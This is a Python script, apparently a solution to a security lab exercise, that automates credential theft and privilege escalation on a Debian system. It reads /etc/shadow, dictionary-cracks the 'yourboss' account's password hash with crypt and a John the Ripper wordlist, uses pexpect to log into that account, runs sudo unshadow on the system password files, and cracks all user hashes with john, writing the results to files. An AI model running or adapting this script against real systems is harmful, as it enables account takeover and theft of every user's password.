#!/usr/bin/env python3

import subprocess
import crypt
import re
import sys
import time
import pexpect
from typing import *

def bash_write(cmd):
    """Executes cmd in a bash terminal
    """
    return subprocess.Popen(
        cmd, shell=True, executable='/bin/bash')

def bash_get(cmd):
    """Executes cmd in a bash terminal and returns the result
    """
    return subprocess.run(cmd.split(), stdout=subprocess.PIPE).stdout.decode('utf-8')

def get_shadow_entry(user: str, shadowFile) -> Tuple[str, str]:
    """Takes a user and a password shadow file from a debian system
    returns a Tuple of the (password hash, password salt) for user.
    """
    try:
        # startIndex = shadowFile.find(user) + len(user) + 1
        # saltIndex = shadowFile.find(user) + len(user) + 4
        
        indexBeginUser = shadowFile.index(user) + (len(user) + 1)
        indexEndUser = shadowFile.index(':', indexBeginUser)
        userPass = shadowFile[indexBeginUser : indexEndUser]
        return userPass
        # userStr = shadowFile[startIndex:]l
        # saltStr = shadowFile[saltIndex:]
        # print(userStr)
        # if user == 'yourboss':
        #     return (userStr[:userStr.index(':') - 1], saltStr[:saltStr.index('$')])
        # else:
        #     return (userStr[:userStr.index(':')], saltStr[:saltStr.index('$')])
    except Exception as ex:
        print('Error: {}. User entered: {}'.format(ex, user))

def main():
    # may be useful at some point: sudo chown -R tempuser:tempuser ./directory-script-is-in
    
    # 1 Get the password of yourboss by using standard crypto (65)
    shadowFile = bash_get(' cat /etc/shadow')
    bossShadowEntry = get_shadow_entry('yourboss', shadowFile)
    with open('bossHashPy.txt', 'w') as f:
        f.write(bossShadowEntry)
    # print(bossShadowEntry)

    # Use crypt to crack bosses pw
    # Hash words in a worddict using crypt and compare them to bossShadowEntry
    wordDict = bash_get(' cat /usr/share/john/password.lst').split()
    for word in wordDict:
        hashedWord = crypt.crypt(word, bossShadowEntry)
        if hashedWord == bossShadowEntry:
            bossPassword = word
            break
    print(bossShadowEntry)
    print(bossPassword)
            
    # 2 Log into yourboss account to escalate to privileges using pexpect
    print('Attempting to su into account \'yourboss\'. Pexpect session started.')
    child = pexpect.spawn('su - yourboss')
    child.logfile = sys.stdout.buffer
    child.expect ('Password:')
    child.sendline(bossPassword)
    child.expect('\$')
    child.sendline('pwd')
    child.expect('\$')
    child.sendline('sudo unshadow /etc/passwd /etc/shadow > shadowFile.txt')
    child.expect ('.*')
    child.sendline(bossPassword)
    child.expect('\$')
    child.sendline('/usr/sbin/john ./shadowFile.txt')
    child.expect('\$', timeout=600)
    child.sendline('/usr/sbin/john ./shadowFile.txt --show > johnResult.txt')
    child.expect('\$')
    # # Crack the sysadmin's password using external tools
    # sysadminShadowEntry = get_shadow_entry('sysadmin', shadowFile)

    # sysadminStr = "echo " + sysadminShadowEntry + " >./sysadminShadowEntry.txt"
    # print('\n\n+++++++++++++++++++++++{}\n'.format(sysadminStr))
    # child.sendline(sysadminStr)
    # child.sendline(johnCmdFirst)
    # child.expect('\$')
    # print(child.before)
    # print(child.after)


if __name__ == '__main__':
    main()
